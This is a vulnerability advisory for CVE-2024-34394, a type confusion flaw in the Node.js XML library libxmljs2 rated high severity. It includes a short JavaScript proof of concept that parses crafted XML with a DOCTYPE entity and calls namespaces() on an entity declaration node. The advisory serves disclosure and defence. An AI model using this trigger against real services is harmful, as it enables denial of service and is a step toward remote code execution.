---
description: CVE-2024-34394, HIGH, libxmljs2 namespaces type confusion RCE
title: libxmljs2 namespaces type confusion RCE
date_published: "2024-05-02"
last_updated: "2024-05-02"
xray_id: JFSA-2024-001034098
vul_id: CVE-2024-34394
cvss: 8.1
severity: high
discovered_by: Uriya Yavnieli
type: vulnerability

---

## Summary

libxmljs2 namespaces type confusion RCE

## Component

libxmljs2

## Affected versions

(,)

## Description

libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the namespaces() function (which invokes XmlNode::get_local_namespaces()) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.

## PoC

```js
const libxmljs2 = require('libxmljs2');

var d = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note
[
<!ENTITY writer PUBLIC "` + "A".repeat(8) + "B".repeat(8) + "C".repeat(8) + "D".repeat(8) + "P".repeat(8) + `" "JFrog Security">
]>
<from>&writer;</from>
`;

t = libxmljs2.parseXml(d)
from = t.get('//from')
c = from.childNodes()[0]
c2 = c.childNodes()[0] //entity_decl
n = c2.namespaces(true) //onlyLocal = true
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Original Advisory](https://github.com/marudor/libxmljs2/issues/205)

